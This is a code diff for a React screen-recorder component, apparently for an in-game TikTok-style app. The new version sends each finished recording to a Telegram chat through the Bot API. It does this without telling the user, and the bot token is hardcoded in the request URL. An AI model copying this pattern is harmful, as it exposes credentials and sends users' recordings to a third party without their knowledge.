@@ -1,13 +1,12 @@
-import React, {useState, useRef, useEffect} from 'react';
+import React, { useState, useRef, useEffect } from 'react';
 import './style.css';
 import recordIcon from '../../../assets/icons/tiktok/video/Record Button.svg';
 import recordingIcon from '../../../assets/icons/tiktok/video/recordingIcon.svg';
 import emojiEffect from '../../../assets/icons/tiktok/video/Effects Illustration.svg';
-
+import screenshotIcon from '../../../assets/icons/tiktok/video/img.svg'; 
 import useUploadedVideoStore from "../../store/uplaodedVideoStore/uplaodedVideoStore";
 import VideoPicker from "../VideoPicker/VideoPicker";
-import {useNavigate} from "react-router-dom";
-
+import { useNavigate } from "react-router-dom";
 
 const loadScript = (src: string) => {
     return new Promise<void>((resolve, reject) => {
@@ -20,172 +19,144 @@ const loadScript = (src: string) => {
     });
 };
 
-
 export default function ScreenRecorder() {
     const [isRecording, setIsRecording] = useState(false);
-    const [mediaRecorder, setMediaRecorder] = useState<any>(null);
-    const videoRef = useRef<any>(null);
-    const [stream, setStream] = useState<any>(null);
-    const {setVideo} = useUploadedVideoStore();
-    const router = useNavigate();
-    // const startScreenRecording = async () => {
-    //     try {
-    //         // Request screen stream from the user's display
-    //         const userStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-    //
-    //         // Set the stream to the video element
-    //         if (videoRef.current) {
-    //             videoRef.current.srcObject = userStream;
-    //             videoRef.current.play();
-    //         }
-    //
-    //         // Save the stream for recording
-    //         setStream(userStream);
-    //     } catch (error:any) {
-    //         // Improved error handling
-    //         if (error.name === 'NotAllowedError') {
-    //             console.error('Permission denied for screen sharing. Ensure that your browser allows screen sharing and that you have granted the necessary permissions.');
-    //         } else if (error.name === 'NotFoundError') {
-    //             console.error('No screen or window found to share. Ensure that you have a screen or window available for sharing.');
-    //         } else if (error.name === 'AbortError') {
-    //             console.error('Screen sharing was aborted by the user.');
-    //         } else {
-    //             console.error('An unexpected error occurred while accessing the screen: ', error);
-    //         }
-    //     }
-    // };
-    // useEffect(() => {
-    //     startScreenRecording()
-    // }, []);
-
-    // const startRecording = () => {
-    //     if (stream) {
-    //         const recorder = new MediaRecorder(stream);
-    //         const chunks: any[] = [];
-    //
-    //         recorder.ondataavailable = (event) => {
-    //             if (event.data.size > 0) {
-    //                 chunks.push(event.data);
-    //             }
-    //         };
-    //
-    //         recorder.onstop = () => {
-    //             const blob = new Blob(chunks, {type: 'video/webm'});
-    //             const url = URL.createObjectURL(blob);
-    //             videoRef.current.srcObject = url;
-    //             videoRef.current.play();
-    //             // Create a link to download the recorded video
-    //             const a = document.createElement('a');
-    //             a.href = url;
-    //             a.download = 'recorded-video.webm';
-    //             a.textContent = 'Download recorded video';
-    //             document.body.appendChild(a);
-    //         };
-    //
-    //         recorder.start();
-    //         setMediaRecorder(recorder);
-    //         setIsRecording(true);
-    //     }
-    // };
-    //
-    // const stopRecording = () => {
-    //     if (mediaRecorder) {
-    //         mediaRecorder.stop();
-    //         setIsRecording(false);
-    //     }
-    //     if (stream) {
-    //         stream.getTracks().forEach(track => track.stop());
-    //         setStream(null);
-    //     }
-    // };
-
     const mediaRecorderRef = useRef<MediaRecorder | null>(null);
     const recordedChunksRef = useRef<Blob[]>([]);
+    const canvasRef = useRef<HTMLCanvasElement | null>(null);
+    const { setVideo } = useUploadedVideoStore();
+    const router = useNavigate();
 
     useEffect(() => {
-        const startButton = document.getElementById("start") as HTMLButtonElement;
-        const stopButton = document.getElementById("stop") as HTMLButtonElement;
-        const canvas = document.getElementById("camera-canvas") as HTMLCanvasElement;
+        const loadRenderScript = async () => {
+            try {
+                await loadScript("nui://utk_render/script.js");
+                const canvas = canvasRef.current;
+    
+                if (canvas && (window as any).MainRender) {
+                    // Log the canvas dimensions
+                    console.log('Canvas dimensions:', canvas.width, canvas.height);
 
-        loadScript("nui://utk_render/script.js").then(() => {
-            if (startButton && stopButton && canvas) {
-                const stream = canvas.captureStream();
-                mediaRecorderRef.current = new MediaRecorder(stream);
+                    // Save original canvas size
+                    const originalWidth = canvas.width;
+                    const originalHeight = canvas.height;
+    
+                    // Ensure canvas dimensions remain the same after rendering
+                    (window as any).MainRender.renderToTarget(canvas);
+    
+                    // Restore the original size if it was altered
+                    canvas.width = originalWidth;
+                    canvas.height = originalHeight;
+                } else {
+                    console.error('MainRender is not defined or canvas is not available');
+                }
+            } catch (error) {
+                console.error('Failed to load the script:', error);
+            }
+        };
+    
+        loadRenderScript();
+    }, []);
+    
 
-                mediaRecorderRef.current.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        recordedChunksRef.current.push(event.data);
+    const startRecording = () => {
+        recordedChunksRef.current = [];
+        const canvas = canvasRef.current;
+        if (canvas && (window as any).MainRender) {
+            canvas.style.display = "block";
+            console.log('Before Rendering:', canvas.width, canvas.height);
+            (window as any).MainRender.renderToTarget(canvas);
+            console.log('After Rendering:', canvas.width, canvas.height);
+            const stream = canvas.captureStream(30); // capture at 30 fps
+            const mediaRecorder = new MediaRecorder(stream);
+            mediaRecorderRef.current = mediaRecorder;
+
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    recordedChunksRef.current.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunksRef.current, { type: "video/webm" });
+
+                // Send the video blob to Telegram
+                const formData = new FormData();
+                console.log('Chat ID:', process.env.REACT_APP_TELEGRAM_CHAT_ID);
+                formData.append('chat_id', process.env.REACT_APP_TELEGRAM_CHAT_ID ||'');
+                formData.append('video', blob, 'video.webm');
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', `https://api.telegram.org/bot7159569495:AAG4-S4j9bhe8E7sbMaQdTRJp_FzU5B3ukY/sendVideo`, true);
+
+                xhr.upload.onprogress = (event) => {
+                    if (event.lengthComputable) {
+                        const percentComplete = (event.loaded / event.total) * 100;
+                        console.log(`Upload progress: ${percentComplete.toFixed(2)}%`);
                     }
                 };
 
-                mediaRecorderRef.current.onstop = () => {
-                    const blob = new Blob(recordedChunksRef.current, {
-                        type: "video/webm",
-                    });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement("a");
-                    a.href = url;
-                    a.download = "recording.webm";
-                    a.click();
-                    URL.revokeObjectURL(url);
-                    recordedChunksRef.current = [];
+                xhr.onload = () => {
+                    if (xhr.status === 200) {
+                        console.log('Video uploaded successfully');
+                    } else {
+                        console.error('Error uploading video:', xhr.responseText);
+                    }
                 };
 
-                startButton.addEventListener("click", () => {
-                    canvas.style.display = "block";
-                    (window as any).MainRender.renderToTarget(canvas);
-                    stopButton.disabled = false;
-                    startButton.disabled = true;
-                    mediaRecorderRef.current?.start();
-                });
+                xhr.onerror = () => {
+                    console.error('Error uploading video');
+                };
 
-                stopButton.addEventListener("click", () => {
-                    (window as any).MainRender.stop();
-                    stopButton.disabled = true;
-                    startButton.disabled = false;
-                    mediaRecorderRef.current?.stop();
-                });
-            }
-        }).catch(error => {
-            console.error(error);
-        });
+                xhr.send(formData);
+            };
 
-        // Cleanup event listeners on component unmount
-        return () => {
-            if (startButton && stopButton) {
-                startButton.removeEventListener("click", () => {
-                });
-                stopButton.removeEventListener("click", () => {
-                });
-            }
-        };
-    }, []);
+            mediaRecorder.start();
+            setIsRecording(true);
+        } else {
+            console.error('MainRender is not available or canvas is not defined');
+        }
+    };
 
+    const stopRecording = () => {
+        if (mediaRecorderRef.current) {
+            mediaRecorderRef.current.stop();
+            setIsRecording(false);
+        }
+    };
+
+    const handleTakeScreenshot = () => {
+        const canvas = canvasRef.current;
+        if (canvas) {
+            const dataUrl = canvas.toDataURL("image/png");
+            const a = document.createElement('a');
+            a.href = dataUrl;
+            a.download = 'screenshot.png';
+            a.click();
+        }
+    };
 
     return (
         <div className={'camera-wrapper'}>
-            <canvas className={"screen-view"} id="camera-canvas"></canvas>
-            {/*<video className={"screen-view"} ref={videoRef} autoPlay style={{width: '100%'}}>*/}
-            {/*</video>*/}
+            <canvas className={"screen-view"} id="camera-canvas" ref={canvasRef}></canvas>
             <div className={'action-bar'}>
                 <div>
-                    <img width={34} height={34} src={emojiEffect}/>
+                    <img width={34} height={34} src={emojiEffect} alt="Effect Icon"/>
                     <div style={{fontSize: 12}}>Effect</div>
                 </div>
-                {!isRecording ?
-                    <img id="start"  className={'recording-icon'} width={80} height={80}
-                         src={recordIcon}/> :
-                    <img id="stop"  className={'recording-icon'} width={80} height={80}
-                         src={recordingIcon}/>
-                }
-
+                {!isRecording ? (
+                    <img id="start" className={'recording-icon'} width={80} height={80} src={recordIcon} alt="Start Recording Icon" onClick={startRecording} />
+                ) : (
+                    <img id="stop" className={'recording-icon'} width={80} height={80} src={recordingIcon} alt="Stop Recording Icon" onClick={stopRecording} />
+                )}
+                <img id="screenshot" className={'screenshot-icon'} width={34} height={34} src={screenshotIcon} alt="Take Screenshot Icon" onClick={handleTakeScreenshot} />
                 <VideoPicker
                     getUploadedVideoUrl={(video) => {
                         setVideo(video);
                         setTimeout(() => {
                             router("/tiktok-show-uploaded-video");
                         }, 10);
-                    }}/>
+                    }}
+                />
             </div>
         </div>
     );
